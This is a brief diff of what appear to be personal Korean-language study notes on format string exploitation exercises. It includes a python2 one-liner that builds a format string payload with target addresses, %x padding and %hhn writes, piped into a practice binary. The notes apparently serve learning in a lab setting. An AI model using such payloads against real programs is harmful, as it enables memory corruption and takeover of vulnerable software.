@@ -46,3 +46,7 @@ tmpbuffer
 1. 하나의 정수는 4바이트
 2. 하나의 HEX는 1 바이트
 3. python2 -c "print '\x8c\xd6\xff\xff'+'aaaa'+'\x8d\xd6\xff\xff' + '%09x.'*5 + '%248x' +'%hhn%92d%hhn'" | ./formatstring_formats5_32 
+
+
+formats9
+3 global variables
